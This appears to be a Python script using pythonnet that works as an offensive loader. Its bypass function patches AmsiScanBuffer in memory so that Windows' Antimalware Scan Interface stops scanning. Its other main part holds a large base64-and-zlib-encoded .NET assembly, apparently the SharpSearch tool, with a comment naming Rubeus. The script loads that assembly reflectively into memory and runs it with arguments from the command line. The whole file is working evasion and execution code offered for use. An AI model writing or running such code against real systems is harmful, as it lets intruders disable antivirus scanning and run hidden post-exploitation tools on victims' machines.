import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSearch.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()